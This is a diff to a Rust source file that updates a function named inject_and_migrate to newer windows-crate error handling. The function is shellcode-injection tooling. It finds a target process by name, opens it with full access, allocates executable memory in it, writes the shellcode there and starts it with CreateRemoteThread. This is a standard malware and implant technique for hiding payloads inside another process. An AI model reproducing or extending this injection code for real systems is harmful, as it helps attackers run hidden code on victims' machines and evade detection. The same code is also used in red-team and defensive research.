@@ -1,6 +1,6 @@
 extern crate windows;
 use std::{mem, ptr};
-use windows::Win32::Foundation::{CHAR, INVALID_HANDLE_VALUE};
+use windows::Win32::Foundation::CHAR;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, PROCESSENTRY32, Process32Next, TH32CS_SNAPPROCESS};
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx};
@@ -10,10 +10,12 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call CreateToolhelp32Snapshot to get a snapshot of all the processes currently running
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.CreateToolhelp32Snapshot.html
-    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) };
-    if snapshot == INVALID_HANDLE_VALUE {
-        panic!("Could not obtain handle to snapshot");
-    }
+    let snapshot = unsafe { 
+        match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0_u32) {
+            Err(_) => panic!("Could not obtain handle to snapshot"),
+            Ok(value) => value
+        }
+    };
 
     // Call Process32Next to iterate over all processes in the snapshot and look for the target process by name
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
@@ -42,7 +44,12 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call OpenProcess to get a handle to the target process via its PID
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.OpenProcess.html
-    let explorer_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
+    let explorer_handle = unsafe { 
+        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
+            Err(_) => panic!("Could not open a handle to the process"),
+            Ok(value) => value
+        }
+    };
 
     // Call VirtualAllocEx to allocate memory for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
@@ -61,5 +68,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
     let start_address_option = unsafe { Some(mem::transmute(base_address)) };
-    unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) };
+    if let Err(_) = unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) } {
+        panic!("CreateRemoteThread failed");
+    }
 }
